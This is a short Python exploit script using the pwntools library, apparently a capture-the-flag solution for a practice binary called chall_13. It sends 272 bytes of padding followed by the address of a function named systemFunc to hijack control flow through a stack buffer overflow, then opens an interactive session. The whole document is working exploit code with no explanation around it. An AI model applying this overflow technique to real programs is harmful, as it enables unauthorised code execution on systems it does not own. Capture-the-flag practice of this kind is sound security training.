from pwn import *

elf = ELF("./chall_13")

p = process("./chall_13")

payload = b'a'*272+p32(elf.sym.systemFunc)

p.sendline(payload)

p.interactive()
